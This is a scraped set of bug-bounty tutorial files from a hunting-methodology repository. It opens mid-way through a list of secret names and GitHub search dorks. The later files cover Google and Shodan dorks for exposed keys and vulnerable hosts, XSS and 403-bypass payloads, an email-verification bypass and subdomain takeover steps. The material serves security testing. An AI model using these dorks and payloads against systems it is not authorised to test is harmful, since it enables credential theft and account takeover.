nSPRING.MAIL.PASSWORD=\nsqsAccessKey=\nsqsSecretKey=\nSQS_NOTIFICATIONS_INTERNAL=\nSQUARE_READER_SDK_REPOSITORY_PASSWORD=\nSRCCLR_API_TOKEN=\nSRC_TOPIC=\nSSHPASS=\nSSMTP_CONFIG=\nSTAGING_BASE_URL_RUNSCOPE=\nSTARSHIP_ACCOUNT_SID=\nSTARSHIP_AUTH_TOKEN=\nSTAR_TEST_AWS_ACCESS_KEY_ID=\nSTAR_TEST_BUCKET=\nSTAR_TEST_LOCATION=\nSTAR_TEST_SECRET_ACCESS_KEY=\nSTORMPATH_API_KEY_ID=\nSTORMPATH_API_KEY_SECRET=\nSTRIPE_PRIVATE=\nSTRIPE_PUBLIC=\nSTRIP_PUBLISHABLE_KEY=\nSTRIP_SECRET_KEY=\nSUBDOMAIN=\nSURGE_LOGIN=\nSURGE_TOKEN=\nSVN_PASS=\nSVN_USER=\ntakesElementScreenshot=\ntakesHeapSnapshot=\ntakesScreenshot=\nTCfbCZ9FRMJJ8JnKgOpbUW7QfvDDnuL4YOPHGcGb6mG413PZdflFdGgfcneEyLhYI8SdlU=\nTEAM_EMAIL=\nted_517c5824cb79_iv=\nTESCO_API_KEY=\ntest=\ntester_keys_password=\nTEST_GITHUB_TOKEN=\nTEST_TEST=\nTHERA_OSS_ACCESS_ID=\nTHERA_OSS_ACCESS_KEY=\nTN8HHBZB9CCFozvq4YI5jS7oSznjTFIf1fJM=\nTOKEN=\ntoken_core_java=\nTRAVIS_ACCESS_TOKEN=\nTRAVIS_API_TOKEN=\nTRAVIS_BRANCH=\nTRAVIS_COM_TOKEN=\nTRAVIS_E2E_TOKEN=\nTRAVIS_GH_TOKEN=\nTRAVIS_PULL_REQUEST=\nTRAVIS_SECURE_ENV_VARS=\nTRAVIS_TOKEN=\nTREX_CLIENT_ORGURL=\nTREX_CLIENT_TOKEN=\nTREX_OKTA_CLIENT_ORGURL=\nTREX_OKTA_CLIENT_TOKEN=\nTRIGGER_API_COVERAGE_REPORTER=\nTRV=\nTWILIO_ACCOUNT_ID=\nTWILIO_ACCOUNT_SID=\nTWILIO_API_KEY=\nTWILIO_API_SECRET=\nTWILIO_CHAT_ACCOUNT_API_SERVICE=\nTWILIO_CONFIGURATION_SID=\nTWILIO_SID=\nTWILIO_TOKEN=\nTWILO=\nTWINE_PASSWORD=\nTWINE_USERNAME=\nTWITTER=\nTWITTEROAUTHACCESSSECRET=\nTWITTEROAUTHACCESSTOKEN=\nTWITTER_CONSUMER_KEY=\nTWITTER_CONSUMER_SECRET=\nUAusaB5ogMoO8l2b773MzgQeSmrLbExr9BWLeqEfjC2hFgdgHLaQ=\nudKwT156wULPMQBacY=\nuiElement=\nuk=\nUNITY_PASSWORD=\nUNITY_SERIAL=\nUNITY_USERNAME=\nURBAN_KEY=\nURBAN_MASTER_SECRET=\nURBAN_SECRET=\nURL=\nUS-EAST-1.ELB.AMAZONAWS.COM=\nUSABILLA_ID=\nuser=\nUSERNAME=\nuserToShareTravis=\nuserTravis=\nUSER_ASSETS_ACCESS_KEY_ID=\nUSER_ASSETS_SECRET_ACCESS_KEY=\nUSE_SAUCELABS=\nUSE_SSH=\nUzhH1VoXksrNQkFfc78sGxD0VzLygdDJ7RmkZPeBiHfX1yilToi1yrlRzRDLo46LvSEEiawhTa1i9W3UGr3p4LNxOxJr9tR9AjUuIlP21VEooikAhRf35qK0=\nV3GNcE1hYg=\nVAULT_ADDR=\nVAULT_APPROLE_SECRET_ID=\nVAULT_PATH=\nVIP_GITHUB_BUILD_REPO_DEPLOY_KEY=\nVIP_GITHUB_DEPLOY_KEY=\nVIP_GITHUB_DEPLOY_KEY_PASS=\nVIP_TEST=\nVIRUSTOTAL_APIKEY=\nVISUAL_RECOGNITION_API_KEY=\nVSCETOKEN=\nVU8GYF3BglCxGAxrMW9OFpuHCkQ=\nvzG6Puz8=\nV_SFDC_CLIENT_ID=\nV_SFDC_CLIENT_SECRET=\nV_SFDC_PASSWORD=\nV_SFDC_USERNAME=\nWAKATIME_API_KEY=\nWAKATIME_PROJECT=\nWATSON_CLIENT=\nWATSON_CONVERSATION_PASSWORD=\nWATSON_CONVERSATION_USERNAME=\nWATSON_CONVERSATION_WORKSPACE=\nWATSON_DEVICE=\nWATSON_DEVICE_PASSWORD=\nWATSON_DEVICE_TOPIC=\nWATSON_PASSWORD=\nWATSON_TEAM_ID=\nWATSON_TOPIC=\nWATSON_USERNAME=\nwebdavBaseUrlTravis=\nWEBHOOK_URL=\nwebStorageEnabled=\nWEB_CLIENT_ID=\nWIDGET_BASIC_PASSWORD=\nWIDGET_BASIC_PASSWORD_2=\nWIDGET_BASIC_PASSWORD_3=\nWIDGET_BASIC_PASSWORD_4=\nWIDGET_BASIC_PASSWORD_5=\nWIDGET_BASIC_USER=\nWIDGET_BASIC_USER_2=\nWIDGET_BASIC_USER_3=\nWIDGET_BASIC_USER_4=\nWIDGET_BASIC_USER_5=\nWIDGET_FB_PASSWORD=\nWIDGET_FB_PASSWORD_2=\nWIDGET_FB_PASSWORD_3=\nWIDGET_FB_USER=\nWIDGET_FB_USER_2=\nWIDGET_FB_USER_3=\nWIDGET_TEST_SERVER=\nWINCERT_PASSWORD=\nWORDPRESS_DB_PASSWORD=\nWORDPRESS_DB_USER=\nWORKSPACE_ID=\nWPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY=\nWPORG_PASSWORD=\nWPT_DB_HOST=\nWPT_DB_NAME=\nWPT_DB_PASSWORD=\nWPT_DB_USER=\nWPT_PREPARE_DIR=\nWPT_REPORT_API_KEY=\nWPT_SSH_CONNECT=\nWPT_SSH_PRIVATE_KEY_BASE64=\nWPT_TEST_DIR=\nWsleZEJBve7AFYPzR1h6Czs072X4sQlPXedcCHRhD48WgbBX0IfzTiAYCuG0=\nWvETELcH2GqdnVPIHO1H5xnbJ8k=\nWVNmZ40V1Lt0DYC2c6lzWwiJZFsQIXIRzJcubcwqKRoMelkbmKHdeIk=\nWWW.GOOGLEAPIS.COM=\nXJ7lElT4Jt9HnUw=\nxsax=\nxsixFHrha3gzEAwa1hkOw6kvzR4z9dx0XmpvORuo1h4Ag0LCxAR70ZueGyStqpaXoFmTWB1z0WWwooAd0kgDwMDSOcH60Pv4mew=\nY8=\nYANGSHUN_GH_PASSWORD=\nYANGSHUN_GH_TOKEN=\nYEi8xQ=\nYHrvbCdCrtLtU=\nYO0=\nYszo3aMbp2w=\nYT_ACCOUNT_CHANNEL_ID=\nYT_ACCOUNT_CLIENT_ID=\nYT_ACCOUNT_CLIENT_SECRET=\nYT_ACCOUNT_REFRESH_TOKEN=\nYT_API_KEY=\nYT_CLIENT_ID=\nYT_CLIENT_SECRET=\nYT_PARTNER_CHANNEL_ID=\nYT_PARTNER_CLIENT_ID=\nYT_PARTNER_CLIENT_SECRET=\nYT_PARTNER_ID=\nYT_PARTNER_REFRESH_TOKEN=\nYT_SERVER_API_KEY=\nYVxUZIA4Cm9984AxbYJGSk=\nzendesk-travis-github=\nzenSonatypePassword=\nzenSonatypeUsername=\nzf3iG1I1lI8pU=\nzfp2yZ8aP9FHSy5ahNjqys4FtubOWLk=\nZHULIANG_GH_TOKEN=\nZOPIM_ACCOUNT_KEY=\nZZiigPX7RCjq5XHbzUpPpMbC8MFxT2K3jcFXUitfwZvNaZXJIiK3ZQJU4ayKaegLvI91x1SqH0=\n\\\"type\\\": \\\"service_account\\\"\n\\?AccessKeyId=\n\\?access_token=\n\\?account=\n\\?id=\n_02ddd67d5586_key=\n_8382f1c42598_iv=\nfilename:.npmrc _auth\nfilename:.dockercfg auth\nextension:pem private\nextension:ppk private\nfilename:id_rsa or filename:id_dsa\nextension:sql mysql dump\nextension:sql mysql dump password\nfilename:credentials aws_access_key_id\nfilename:.s3cfg\nfilename:wp-config.php\nfilename:.htpasswd\nfilename:.env DB_USERNAME NOT homestead\nfilename:.env MAIL_HOST=smtp.gmail.com\nfilename:.git-credentials\nPT_TOKEN language:bash\nfilename:.bashrc password\nfilename:.bashrc mailchimp\nfilename:.bash_profile aws\nrds.amazonaws.com password\nextension:json api.forecast.io\nextension:json mongolab.com\nextension:yaml mongolab.com\njsforce extension:js conn.login\nSF_USERNAME salesforce\nfilename:.tugboat NOT _tugboat\nHEROKU_API_KEY language:shell\nHEROKU_API_KEY language:json\nfilename:.netrc password\nfilename:_netrc password\nfilename:hub oauth_token\nfilename:robomongo.json\nfilename:filezilla.xml Pass\nfilename:recentservers.xml Pass\nfilename:config.json auths\nfilename:idea14.key\nfilename:config irc_pass\nfilename:connections.xml\nfilename:express.conf path:.openshift\nfilename:.pgpass\nfilename:proftpdpasswd\nfilename:ventrilo_srv.ini\n[WFClient] Password= extension:ica\nfilename:server.cfg rcon password\nJEKYLL_GITHUB_TOKEN\nfilename:.bash_history\nfilename:.cshrc\nfilename:.history\nfilename:.sh_history\nfilename:sshd_config\nfilename:dhcpd.conf\nfilename:prod.exs NOT prod.secret.exs\nfilename:prod.secret.exs\nfilename:configuration.php JConfig password\nfilename:config.php dbpasswd\nfilename:config.php pass\npath:sites databases password\nshodan_api_key language:python\nshodan_api_key language:shell\nshodan_api_key language:json\nshodan_api_key language:ruby\nfilename:shadow path:etc\nfilename:passwd path:etc\nextension:avastlic \"support.avast.com\"\nfilename:dbeaver-data-sources.xml\nfilename:sftp-config.json\nfilename:.esmtprc password\nextension:json googleusercontent client_secret\nHOMEBREW_GITHUB_API_TOKEN language:shell\nxoxp OR xoxb\n.mlab.com password\nfilename:logins.json\nfilename:CCCam.cfg\nmsg nickserv identify filename:config\nfilename:settings.py SECRET_KEY\nfilename:secrets.yml password\nfilename:master.key path:config\nfilename:deployment-config.json\nfilename:.ftpconfig\nfilename:.remote-sync.json\nfilename:sftp.json path:.vscode\nfilename:WebServers.xml\n```\n\n## Author:\n[@manasH4rsh](https://twitter.com/manasH4rsh)\n", "timestamp": "2025-10-21T22:02:20.554001"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Sensitive_Info_Leaks/Google_Dorks.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Sensitive_Info_Leaks/Google_Dorks.md", "content": "### Google Dorks to find Juicy Content\n\n`inurl:example.com intitle:\"index of\"` <br>\n`inurl:example.com intitle:\"index of /\" \"*key.pem\"` <br>\n`inurl:example.com ext:log` <br>\n`inurl:example.com intitle:\"index of\" ext:sql|xls|xml|json|csv` <br>\n`inurl:example.com \"MYSQL_ROOT_PASSWORD:\" ext:env OR ext:yml -git` <br>\n`inurl:example.com intitle:\"index of\" \"config.db\"` <br>\n`inurl:example.com allintext:\"API_SECRET*\" ext:env | ext:yml` <br>\n`inurl:example.com intext:admin ext:sql inurl:admin` <br>\n`inurl:example.com allintext:username,password filetype:log` <br>\n`site:example.com \"-----BEGIN RSA PRIVATE KEY-----\" inurl:id_rsa`<br>\n`site:*.gov.* \"responsible disclosure\"`<br>\n\n![t](https://miro.medium.com/max/550/1*N9W6DfGA6wxgKTiywV9aUA.png) <br>\n\n\n[Refrence](https://blog.usejournal.com/how-recon-helped-samsung-protect-their-production-repositories-of-samsungtv-ecommerce-estores-4c51d6ec4fdd)\n\n\n#### Other than Google, Try these dorks on various Search Engines such as Duck Duck Go, Bing etc.\n\n## Reports (Hackerone)\n\n### Resolved\n\n- [Securing \"Reset password\" pages from bots](https://hackerone.com/reports/43807)\n- [Private Grab Messages on Android App can be accessed and cached by Search Engines](https://hackerone.com/reports/221558)\n\n### Informative\n\n- [Information disclosure through search engines (password reset token)](https://hackerone.com/reports/322988)\n\n### N/A\n\n- [Research papers on yelp are getting indexed by google bots.](https://hackerone.com/reports/207435)\n\n\nAuthor \n- [Keshav Malik](twitter.com/g0t_rOoT_) <br>\n- [Naveen Prakaasham](twitter.com/NPrakaasham) <br>\n- [@klaus](https://twitter.com/klaus_dev)\n- [Fani Malik](https://twitter.com/fanimalikhack)\n", "timestamp": "2025-10-21T22:02:20.680807"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Sensitive_Info_Leaks/Shodan_cve_dorks.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Sensitive_Info_Leaks/Shodan_cve_dorks.md", "content": "## CVE's Shodan Dorks.\n\n* Big IP shodan Search:- \n\n`http.title:\"BIG-IP&reg;-Redirect\" org:Org`\n\n* CVE 2020-3452\n \n` http.html_hash:-628873716 \n“set-cookie: webvpn;”` \n\n* CVE CVE-2019-11510\n\n`http.html:/dana-na/`  \n\n* CVE-2020–5902\n \n ```inurl:/tmui/login.jsp```\n\n\n## Author:\n- [@manasH4rsh](https://twitter.com/manasH4rsh)\n- [Fani Malik](https://twitter.com/FaniMalikHack)\n", "timestamp": "2025-10-21T22:02:20.809811"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Sensitive_Info_Leaks/Version_Leak.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Sensitive_Info_Leaks/Version_Leak.md", "content": "# Version Leak\n\n```\nstep1. go to the target says- https://redacted.com\nstep2. open view page source\nstep3. check for path, directories\nstep4. go that path says- https://redacted.com/theme/css/file.css\nstep5. try to visit all directories and check it is accessible or not.\nstep5. if it is give 403\nstep6. add %0, %m, %2e, says- https://redacted.com/%0theme and then check the response, it will show the running server name, and version information.\n```\n- And check for also css path url, sometime it contain some path.\n", "timestamp": "2025-10-21T22:02:20.914013"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Sign_Up_Functionality/Hunting_for_bugs_in_signup_feature.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Sign_Up_Functionality/Hunting_for_bugs_in_signup_feature.md", "content": "### Implementing the Sign Up Feature:\n\nWe will take the example of a School Website(**school.org**) to learn the implementation of Sign Up Feature:  \nIn this Example, The Students need to register to **school.org** for accessing their Academic educational resource. Users of **school.org** must have the ability to register as a member thus gaining access to the content of the site.\n\nSo, The Signup process can be implemented by school in two ways:\n\n1.  **Manual Signup** — Registration based on user providing a series of specific user information. It usually includes form like name, email, password, confirm password, etc. as shown in image below.\n\n\n2.  **Social Signup** **/OAuth**— Registration via an integrated social media source via social media platform like _Facebook_, _Twitter_, or _Google_, the user can sign into a third party website instead of creating a new account specifically for that website.\n\nIn this Blog I will be talking about Bugs in Manual Sign up. Lets have Social Signup/ OAuth for our next blog topic.\n\n### Exploiting Signup Feature:\n\n#### 1\\. Duplicate registration / Overwrite existing user.\n\nDuplicate registration is when an application allows us to register or sign up with the same email address, username or phone number. It can have critical consequences based on what kind of attack is performed.\n\n**_Steps to reproduce:_**\n\n1) Create first account in application with email say [abc@gmail.com](mailto:abc@gmail.com) and password.  \n2) Logout of the account and create another account with same email and different password.  \n3) You can even try to change email case in some case like from [abc@gmail.com](mailto:abc@gmail.com) to [Abc@gmail.com](mailto:Abc@gmail.com)  \n4) Finish the creation process — and see that it succeeds  \n5) Now go back and try to login with email and the new password. You are successfully logged in.\n\n> **Further Read**  \n>  [https://hackerone.com/reports/187714](https://hackerone.com/reports/187714)  \n>  [https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf](https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf)  \n>  [https://blog.securitybreached.org/2020/01/22/user-account-takeover-via-signup-feature-bug-bounty-poc/](https://blog.securitybreached.org/2020/01/22/user-account-takeover-via-signup-feature-bug-bounty-poc/)\n\n#### 2\\. DOS at Name/Password field in Signup Page.\n\nBy sending a very long string (100000 characters) it’s possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion.\n\n**_Steps to reproduce:_**\n\n1) Go Sign up form.  \n2) Fill the form and enter a long string in password  \n3) Click on enter and you’ll get 500 Internal Server error if it is vulnerable.\n\n> Further Read  \n>  [https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0](https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0)  \n>  [https://hackerone.com/reports/738569](https://hackerone.com/reports/738569)  \n>  [https://hackerone.com/reports/223854](https://hackerone.com/reports/223854)\n\n#### 3\\. Cross-Site Scripting (XSS) in username, account name for registration.\n\n**Cross-site Scripting** (**XSS**) is a security vulnerability usually found in websites and/or web applications that accept user input. This injects the malicious code into the targeted website’s content, making it a part of the website and thus allowing it to affect victims who may visit or view that website.\n\nNow, for testing Signup page for XSS we can simply insert XSS payoad in fields like: username, email, password,etc.\n\nPayload for Username field : **<svg/onload=confirm(1)>**  \nPayload for Email field : **“><svg/onload=confirm(1)>”@x.y**\n\n> Further Read  \n>  [https://hackerone.com/reports/196989](https://hackerone.com/reports/196989)  \n>  [https://hackerone.com/reports/470206](https://hackerone.com/reports/470206)  \n>  [https://hackerone.com/reports/119090](https://hackerone.com/reports/119090)\n\n#### 4\\. No Rate Limit at Signup Page.\n\nA **rate limiting** algorithm is used to check if the user session (or IP address) has to be **limited** based on the information in the session cache. Testing for Rate limit at Signup page is quite a good idea.\n\nThe Impact can be explained very well. If there is no rate limiting on signup page a malicious users can generate hundreds and thousands of fake accounts that lead to fill the application DataBase with fake accounts, Which can impact the business in many ways.\n\nYou can easily test for it with Burp Intruder.  \n1\\. Capture the signup request and send it to Intruder.  \n2\\. Add different emails as payload .  \n3\\. Fire up Intruder, And check whether it returns 200 OK.\n\n\n> Further Read  \n>  [https://hackerone.com/reports/905692](https://hackerone.com/reports/905692)  \n>  [https://hackerone.com/reports/97609](https://hackerone.com/reports/97609)  \n>  [https://hackerone.com/reports/262830](https://hackerone.com/reports/262830)\n\n#### 5\\. Insufficient Email Verification.\n\nInsufficient Email Verification means the application doesn’t verify the email id or the verification mechanism is too weak to be bypassed. You can easily Bypass Email Verification with some of the following common methods like:\n\n1.  Forced Browsing. (directly navigating to files which comes after verifying the email)\n2.  Response or Status Code Manipulation. (Replacing the bad response status like 403 to 200 can be useful)\n3.  There are much more ways of bypassing . **Tip**: Just google it.\n#### Email verification bypass after signup:-\n\n```\n1. Sing up on the web application as attacker@mail.com\n2. You will receive a confirmation email on attacker@mail.com, do not open that link now.\n3. The application may ask for confirming your email, check if it allows navigating to account settings page.\n4. On settings page check if you can change the email.\n5. If allowed, change the email to victim@mail.com.\n6. Now you will be asked to confirm victim@mail.com by opening the confirmation link received on victim@mail.com, insted of opening the new link go to attacker@mail.com inbox and open the previous received link.\n7. If the application verifies vitim@mail.com by using perivious verification link received on attacker mail, then this is a email verification bypass. \n```\n> Further Read  \n>  [https://hackerone.com/reports/1040047](https://hackerone.com/reports/1040047)  \n>  [https://hackerone.com/reports/617896](https://hackerone.com/reports/617896)  \n>  [https://hackerone.com/reports/737169](https://hackerone.com/reports/737169)\n\n#### 6\\. Path Overwrite\n\nIf an application allows users to check their profile with direct path /{username} always try to signup with system reserved file names, such as index.php, signup.php, login.php, etc. In some cases what happens here is, when you signup with username: `index.php`, now upon visiting target.tld/index.php, your profile will comeup and occupy the index.php page of an application. Similarly, if an attacker is able to signup with username `login.php`, Imagine login page getting takeovered.\n\n> Further Read:\nhttps://infosecwriteups.com/logical-flaw-resulting-path-hijacking-dd4d1e1e832f\n  \n**_Thanks for Reading. Any Suggestions are always welcomed!!_**\n\n## Sources:-\n\n+ https://twitter.com/kushagrasarathe/status/1385111472385060867?s=19\n\n## Author:-\n\n+ @Kushagra Sarathe - [Twitter](https://twitter.com/kushagrasarathe) & [GitHub](https://github.com/kushagrasarathe)\n+ @Sm4rty - [Twitter](https://twitter.com/Sm4rty\\_)  , [LinkedIn](https://www.linkedin.com/in/sm4rty) &  [Instragram](https://www.instagram.com/sm4rty)\n", "timestamp": "2025-10-21T22:02:21.505928"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Status_Code_Bypass/403Bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Status_Code_Bypass/403Bypass.md", "content": "## 403 Bypass\nI am sharing all this tips and techniques from my own personal experience there no official references for that\n\n### Directory Based\nIf you see directory with no slash at end then do these acts there\n```\nsite.com/secret => 403\nsite.com/secret/* => 200\nsite.com/secret/./ => 200\n```\n### File Base\nIf you see file without any slash at end then do these acts there\n```\nsite.com/secret.txt => 403\nsite.com/secret.txt/ => 200\nsite.com/%2f/secret.txt/ => 200\n```\n### Protocol Base\nWell, sound wired but check out the example for better understanding\n```\nhttps://site.com/secret => 403\nhttp://site.com/secret => 200\n```\n## Payloads\n```\n/\n/*\n/%2f/\n/./\n./.\n/*/\n```\n### Header\n[https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/](https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/)\n```\nX-Forwarded-For: 127.0.0.1\n```\n\n### Tools\nHere is a Tool I found on twitter.\n* [https://github.com/yunemse48/403bypasser](https://github.com/yunemse48/403bypasser)\n* [https://github.com/Dheerajmadhukar/4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)\n\n## Proof Of Concept\nWell Always look for some references or proof of concept if someone sharing any tips so you may confirm you are not wasting your time at all.\nI have some poc video on my YouTube channel for 403 and other Improper access control bugs with those methods. You can check them\n\nYouTube: [Mehedi Hasan Remon](https://www.youtube.com/channel/UCF_yxU7acxUojiGiOAMafQQ/videos?view_as=subscriber)\n\nAuthor:[@remonsec](https://twitter.com/remonsec)\n       [@KathanP19](https://twitter.com/KathanP19)\n", "timestamp": "2025-10-21T22:02:22.115511"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Subdomain_Takeover/Sub_or_top_level_domain_takeover.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Subdomain_Takeover/Sub_or_top_level_domain_takeover.md", "content": "# Subs or Top level Domain\n\n- CNAME Record 0r A Record —> Points to third party services\n\n- Check:\n```\n     for take-overs is to query a list of domains and check for any that are either:\n\n    1. attached to a third party domain or destination via the use of a cname record \n\n    2.return a 404 not found error.\n\n    example : domain that resolved to a CloudFront domain which gave the following error: \"Error the request could not be satisfied, generated by CloudFront (CloudFront)\"\n```\n### Technical Detail\n\n- This attack vector utilizes DNS entries pointing to Service Providers where the pointed subdomain is currently not in use\n- Service providers : \n```\n    Heroku, Github, Bitbucket, Squarespace, Shopify, Desk, Teamwork, Unbounce, Helpjuice, HelpScout, Pingdom, Tictail, Campaign Monitor, CargoCollective, [StatusPage.io](http://statuspage.io/) and Tumblr.\n```\n### Impact\n\n- Attacker can now build a complete clone of the real site, add a login form, redirect the user, steal credentials (e.g. admin accounts), cookies and/or completely destroy business credibility for your company.\n- Another senario:\n```\n    1. A Domain Owner points their * (wildcard) DNS-entry to e.g. Heroku.\n    2. They forget to add the wildcard-entry to their Heroku-app.\n    3. Attacker can now claim any subdomain they want from the Domain Owner.\n    4. A Domain Owner will be unaware of the subdomain being exploited.\n```\n- In the not so rare case, the attacker can also “inherit” the Domain Owner’s Wildcard SSL used inside the Service Provider.\n\n### Exploit\n\n- Claim CloudFront:\n```\n    Singup to AWS —> head over CloudFront signup\n```\n### Remediation\n```\n    - Check your DNS-configuration for subdomains pointing to services not in use.\n    - Set up your external service so it fully listens to your wildcard DNS. In Heroku’s case, this means running the following command in your App: heroku domains:add *.[example.com](http://example.com/)\n```\n### Reference\n- Detectify article :[https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/)\n- Zsec Blog: [https://blog.zsec.uk/subdomainhijack/](https://blog.zsec.uk/subdomainhijack/)\n\n### POC\n```\n- I found a website, for now call it [www.target.com](http://www.target.com)  \n- I went to terminal and run a host command on that target\n\nhost www.target.com\n\n- it was pointing its 'A' record to  23.227.38.65 this IP \n- Now i knew that this IP belongs to shopify cause i had setup a shop on shopify few days back (you can also go and check with whois record for this ip)\n- I opened the website [www.target.com](http://www.target.com) , I found there shopify template stating  \"only one step left to finish setting\" (In some cases : it also state Sorry this shop is unavailable) \n- Now i knew what i have to do, i sing-up on shopify with trial account, after that i put the same target website name, it gave me error stating application name already exist, so put target.com as a name, finally it was created.\n- I went to setting, it shows me two option \"connect your domain automatically\" and \"connect you domain manually\"\n- I choose first one automatic one, just put that domain [www.target.com](http://www.target.com) , it got connected. We are done, now we owns this top level domain.\n```\n### Analysis\n```\n- The person registered this domain name from godaddy , and configured its DNS record pointing to shopify IP\n- Either he might had forgotten to create a shop or he had created a shop used it for a while then deleted that shop from shopify but didn't removed the DNS entry pointing to shopify's IP\n```\n\n** Pardon for any spelling or grammar mistake **\n\n### Author:\n- Twitter Id: @Zero0x00\n", "timestamp": "2025-10-21T22:02:22.907678"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Subdomain_Takeover/Subdomain_Takeover.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Subdomain_Takeover/Subdomain_Takeover.md", "content": "# Subdomain Takeover\n\n## Basics\n\n### DNS\n![DNS](dns.png)\n* When a web address is accessed eg. \"www.xyz.com\", a DNS query is performed across a DNS server with the host name.\n* The DNS server takes the hostname and resolves it into a numeric IP address \n\n### CNAME\n![CNAME](cname.png)\n* An alias of domain name to another domain name\n* In the example below, xyz.company.com is a source domain and xyz.cloudservice.com is a canonical domain name.\n\n\n\n\n\n![Subtakeover_basics](subdomain_takeover.png)\n\n* Subdomains map themselves to a specific IP, 3rd party services like Azure, AWS, Heroku, Github, Fastly, Shopify, etc. to serve the contents. These subdomains use a CNAME record to another domain [eg. xyz.company.com CNAME xyz.cloudservice.com]\n* Now due to whatever reason, the company decides to stop utilizing this service and to save some bucks, the company cancels the subscription of the 3rd party cloud service provider.\n* But, the company forgets to update or simply remove the CNAME record in the DNS zone file\n* Since the CNAME record is not deleted from company.com DNS zone, anyone who registers xyz.cloudservice.com has full control over xyz.company.com until the DNS record is present.\n\n## How to find subdomain takeover ?\n\n### 1. Subdomain Enumeration\nUse the following tools to enumerate subdomains\n* [Assetfinder](https://github.com/tomnomnom/assetfinder)\n* [Subfinder](https://github.com/projectdiscovery/subfinder)\n* [Findomain](https://github.com/Edu4rdSHL/findomain)\n\n### 2. Checking for takeover\nThe following tools are designed to scan a list of subdomains concurrently and identify ones that are able to be hijacked.\n* [Subjack](https://github.com/haccer/subjack)\n* [SubOver](https://github.com/Ice3man543/SubOver)\n\nYou can also verify if the subdomain is vulnerable or not by going through common error pages.\n### 3. Hijacking the subdomain\nUse the following github repositiory to check if the engine is vulnerable or not and the steps for hijacking a particular engine.\n* [https://github.com/EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)\n\nIf you cannot find your engine in the above repository, [Google](https://www.google.com) is your friend !\n\n# Case : CNAME available to buy\n![CNAME available to buy](cname_buy.png)\n* There are cases when the CNAME that a subdomain points to, is available to buy. \n* In that case the attacker can directly buy that domain and host his/her content.\n\n### References\n[How we Hijacked 26+ Subdomains](https://medium.com/@aishwaryakendle/how-we-hijacked-26-subdomains-9c05c94c7049)\n\n[Subdomain Takeover: Finding Candidates](https://0xpatrik.com/subdomain-takeover-candidates/)\n\n[Subdomain Takeover: Proof Creation for Bug Bounties](https://0xpatrik.com/takeover-proofs/)\n\n#### Check out our talk on the same at NULL / OWASP Bangalore meetup, June 2020\n[https://www.youtube.com/watch?v=xCunHBH8ZQ4](https://www.youtube.com/watch?v=xCunHBH8ZQ4)\n\n### Reports (Hackerone)\n\n#### Resolved\n\n- [subdomain takeover at news-static.semrush.com](https://hackerone.com/reports/294201)\n- [Subdomain takeover of resources.hackerone.com](https://hackerone.com/reports/863551)\n- [Subdomain takeover at info.hacker.one](https://hackerone.com/reports/202767)\n- [Bulgaria - Subdomain takeover of mail.starbucks.bg](https://hackerone.com/reports/736863)\n- [Remote code execution by hijacking an unclaimed S3 bucket in Rocket.Chat's installation script.](https://hackerone.com/reports/399166)\n- [Possible SOP bypass in www.starbucks.com due to insecure crossdomain.xml](https://hackerone.com/reports/244504)\n\n# Authors:\n[@aish_kendle](https://twitter.com/aish_kendle)\n\n[@thakare_prateek](https://twitter.com/thakare_prateek)\n\n[@klaus](https://twitter.com/klaus_dev)\n", "timestamp": "2025-10-21T22:02:23.018945"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Weak_Password_Policy/Weak_password_policy.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Weak_Password_Policy/Weak_password_policy.md", "content": "<h4>Summary:</h4>\n\nA weak password policy increases the probability of an attacker having success using brute force and dictionary attacks against user accounts. An attacker who can determine user passwords can take over a user's account and potentially access sensitive data in the application.\n\nThere are two ways in which this can be checked \n\n### First Way \n\n- Check if you can use Password same as that of Email Address\n- Check if you can use Username same as that of Email Address\n- Try above mentioned when Resetting Password , Creating Account , Changing Password from Account Settings\n\n### Second Way \n\n- Check if you can use Password some Weak Passwords such as 123456, 111111 , abcabc , qwerty123\n- Try above mentioned when Resetting Password , Creating Account , Changing Password from Account Settings\n\n* Applications usually have Restrictions on Password while Creating Account, Make sure you check for both the cases when Resetting Password\n\n\n### References\n\n- [All About Weak Password Policy](http://applicationsecurity.io/appsec-findings-database/weak-password-policy/)\n- [OWASP Guide for Weak Passwords](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy)\n", "timestamp": "2025-10-21T22:02:24.352605"}
